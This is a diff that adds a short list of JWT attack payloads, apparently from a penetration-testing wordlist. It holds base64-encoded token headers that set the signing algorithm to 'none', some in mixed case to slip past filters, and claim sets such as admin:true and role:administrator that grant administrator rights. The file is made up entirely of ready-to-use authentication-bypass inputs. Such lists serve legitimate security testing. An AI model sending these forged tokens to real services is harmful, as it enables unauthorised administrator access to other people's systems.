@@ -1,0 +1,13 @@
+# JWT (JSON Web Token) Payloads
+
+# None Algorithm Header
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
+
+# None Algorithm Header (mixed cases/bypasses)
+eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0
+eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0
+
+# Typical Payload Modifications (Admin user)
+{"user":"admin","admin":true}
+{"role":"administrator","authorized":true}
+{"sub":"admin","name":"administrator"}
